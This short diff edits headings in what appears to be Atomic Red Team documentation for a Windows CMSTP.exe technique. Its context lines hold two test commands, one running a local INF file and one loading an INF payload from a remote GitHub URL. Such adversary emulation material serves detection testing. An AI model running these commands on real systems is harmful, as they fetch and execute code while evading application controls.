@@ -7,9 +7,11 @@
 
 ### Local
 
+Local:
+
     cmstp.exe /s CMSTP.inf
 
-### Remote:
+Remote:
 
     cmstp.exe /ni /s https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/CMSTP.inf
 
